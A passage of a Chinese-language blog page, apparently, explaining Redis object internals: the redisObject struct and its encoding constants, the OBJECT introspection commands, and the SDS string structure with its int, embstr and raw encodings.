+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#define OBJ_ZSET 3      </span><span style=color:#8f5902;font-style:italic>/* Sorted set object. */</span><span style=color:#8f5902;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#define OBJ_HASH 4      </span><span style=color:#8f5902;font-style:italic>/* Hash object. */</span><span style=color:#8f5902;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>/* Objects encoding. Some kind of objects like Strings and Hashes can be
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic> * internally represented in multiple ways. The &#39;encoding&#39; field of the object
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic> * is set to one of this fields for this object. */</span>
+</span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#define OBJ_ENCODING_RAW 0     </span><span style=color:#8f5902;font-style:italic>/* Raw representation */</span><span style=color:#8f5902;font-style:italic> 						</span><span style=color:#8f5902;font-style:italic>// 编码为字符串
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span><span style=color:#8f5902;font-style:italic>#define OBJ_ENCODING_INT 1     </span><span style=color:#8f5902;font-style:italic>/* Encoded as integer */</span><span style=color:#8f5902;font-style:italic> 						</span><span style=color:#8f5902;font-style:italic>// 编码为整数
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span><span style=color:#8f5902;font-style:italic>#define OBJ_ENCODING_HT 2      </span><span style=color:#8f5902;font-style:italic>/* Encoded as hash table */</span><span style=color:#8f5902;font-style:italic>					</span><span style=color:#8f5902;font-style:italic>// 编码为哈希表
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span><span style=color:#8f5902;font-style:italic>#define OBJ_ENCODING_ZIPMAP 3  </span><span style=color:#8f5902;font-style:italic>/* Encoded as zipmap */</span><span style=color:#8f5902;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#define OBJ_ENCODING_LINKEDLIST 4 </span><span style=color:#8f5902;font-style:italic>/* No longer used: old list encoding. */</span><span style=color:#8f5902;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#define OBJ_ENCODING_ZIPLIST 5 </span><span style=color:#8f5902;font-style:italic>/* Encoded as ziplist */</span><span style=color:#8f5902;font-style:italic>							</span><span style=color:#8f5902;font-style:italic>// 编码为压缩列表
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span><span style=color:#8f5902;font-style:italic>#define OBJ_ENCODING_INTSET 6  </span><span style=color:#8f5902;font-style:italic>/* Encoded as intset */</span><span style=color:#8f5902;font-style:italic>							</span><span style=color:#8f5902;font-style:italic>// 编码为整数集合
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span><span style=color:#8f5902;font-style:italic>#define OBJ_ENCODING_SKIPLIST 7  </span><span style=color:#8f5902;font-style:italic>/* Encoded as skiplist */</span><span style=color:#8f5902;font-style:italic>					</span><span style=color:#8f5902;font-style:italic>// 编码为跳跃表
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span><span style=color:#8f5902;font-style:italic>#define OBJ_ENCODING_EMBSTR 8  </span><span style=color:#8f5902;font-style:italic>/* Embedded sds string encoding */</span><span style=color:#8f5902;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#define OBJ_ENCODING_QUICKLIST 9 </span><span style=color:#8f5902;font-style:italic>/* Encoded as linked list of ziplists */</span><span style=color:#8f5902;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>#define OBJ_ENCODING_STREAM 10 </span><span style=color:#8f5902;font-style:italic>/* Encoded as a radix tree of listpacks */</span><span style=color:#8f5902;font-style:italic>
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>
+</span></span><span style=display:flex><span><span style=color:#204a87;font-weight:700>typedef</span> <span style=color:#204a87;font-weight:700>struct</span> <span style=color:#000>redisObject</span> <span style=color:#000;font-weight:700>{</span>
+</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic>// 数据类型，OBJ_STRING等
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#204a87;font-weight:700>unsigned</span> <span style=color:#f57900>type</span><span style=color:#000;font-weight:700>:</span><span style=color:#0000cf;font-weight:700>4</span><span style=color:#000;font-weight:700>;</span>
+</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic>// 编码方式，OBJ_ENCODING_RAW等
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#204a87;font-weight:700>unsigned</span> <span style=color:#f57900>encoding</span><span style=color:#000;font-weight:700>:</span><span style=color:#0000cf;font-weight:700>4</span><span style=color:#000;font-weight:700>;</span>
+</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic>// #define LRU_BITS 24
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#8f5902;font-style:italic>// LRU 时间	
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#204a87;font-weight:700>unsigned</span> <span style=color:#f57900>lru</span><span style=color:#000;font-weight:700>:</span><span style=color:#000>LRU_BITS</span><span style=color:#000;font-weight:700>;</span> <span style=color:#8f5902;font-style:italic>/* LRU time (relative to global lru_clock) or
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>                            * LFU data (least significant 8 bits frequency
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic>                            * and most significant 16 bits access time). */</span>
+</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic>// 引用计数 
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>refcount</span><span style=color:#000;font-weight:700>;</span>
+</span></span><span style=display:flex><span>    <span style=color:#8f5902;font-style:italic>// 指向对象的值
+</span></span></span><span style=display:flex><span><span style=color:#8f5902;font-style:italic></span>    <span style=color:#204a87;font-weight:700>void</span> <span style=color:#ce5c00;font-weight:700>*</span><span style=color:#000>ptr</span><span style=color:#000;font-weight:700>;</span>
+</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>}</span> <span style=color:#000>robj</span><span style=color:#000;font-weight:700>;</span>
+</span></span></code></pre></div><h2 id=类型自省>类型自省</h2><h3 id=type-keyname><code>type keyname</code></h3><p><strong>type</strong> REDIS_STRING, REDIS_LIST, REDIS_HASH, REDIS_SET or REDIS_ZSET,</p><h3 id=object-encoding-keyname><code>object encoding keyname</code></h3><p><strong>encoding</strong> int, embstr or raw for REDIS_STRING,</p><h3 id=object-idletime-keyname-unit-is-second><code>object idletime keyname (unit is second)</code></h3><p><strong>lru</strong> access time</p><h3 id=object-refcount-keyname><code>object refcount keyname</code></h3><p>only for number-format string, shared object ref count</p><h2 id=string>String</h2><h3 id=simple-dynamic-string>Simple Dynamic String</h3><div class=highlight><pre tabindex=0 style=background-color:#f8f8f8;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#204a87;font-weight:700>struct</span> <span style=color:#000>sdshdr</span> <span style=color:#000;font-weight:700>{</span>
+</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>len</span><span style=color:#000;font-weight:700>;</span>
+</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>int</span> <span style=color:#000>free</span><span style=color:#000;font-weight:700>;</span>
+</span></span><span style=display:flex><span>    <span style=color:#204a87;font-weight:700>char</span> <span style=color:#000>buf</span><span style=color:#000;font-weight:700>[];</span>
+</span></span><span style=display:flex><span><span style=color:#000;font-weight:700>};</span>
+</span></span></code></pre></div><h3 id=redis_string>REDIS_STRING</h3><p><strong>int</strong>, 8 bytes long</p><p><strong>embstr</strong> &lt;=39 bytes readonly string</p><p><strong>raw</strong> > 39 bytes</p></div></main></div></div><footer class="bg-dark py-5 row d-print-none"><div class="container-fluid mx-sm-5"><div class=row><div class="col-6 col-sm-4 text-xs-center order-sm-2"></div><div class="col-6 col-sm-4 text-right text-xs-center order-sm-3"><ul class="list-inline mb-0"><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=GitHub aria-label=GitHub><a class=text-white target=_blank rel=noopener href=https://github.com/jrrwll aria-label=GitHub><i class="fab fa-github"></i></a></li><li class="list-inline-item mx-2 h3" data-toggle=tooltip data-placement=top title=Email aria-label=Email><a class=text-white target=_blank rel=noopener href=mailto:jrrwll@outlook.com aria-label=Email><i class="fa fa-envelope"></i></a></li></ul></div><div class="col-12 col-sm-4 text-center py-2 order-sm-2"><small class=text-white>&copy; 2022 Jerry Will 保留所有权利</small>
+<small class=ml-1><a href=https://policies.dreamcat.org/privacy target=_blank rel=noopener>隐私政策</a></small><p class=mt-2><a href=/about/>关于</a></p></div></div></div></footer></div><script src=https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js integrity=sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN crossorigin=anonymous></script>
+<script src=https://cdn.jsdelivr.net/npm/bootstrap@4.6.1/dist/js/bootstrap.min.js integrity="sha512-UR25UO94eTnCVwjbXozyeVd6ZqpaAE9naiEUBK/A+QDbfSTQFhPGj5lOR6d8tsgbBk84Ggb5A3EkjsOgPRPcKA==" crossorigin=anonymous></script>
+<script src=https://cdn.jsdelivr.net/npm/mermaid@8.13.4/dist/mermaid.min.js integrity="sha512-JERecFUBbsm75UpkVheAuDOE8NdHjQBrPACfEQYPwvPG+fjgCpHAz1Jw2ci9EXmd3DdfiWth3O3CQvcfEg8gsA==" crossorigin=anonymous></script>
+<script src=/js/tabpane-persist.js></script>
+<script src=/js/deflate.js></script>
+<script src=/js/main.min.16646f9ec6b252c516cfdecab0a2e7bb69bb6d31b4cac2ac9d8d290345d5dede.js integrity="sha256-FmRvnsayUsUWz97KsKLnu2m7bTG0ysKsnY0pA0XV3t4=" crossorigin=anonymous></script>
+<script src=/js/prism.js></script></body></html>
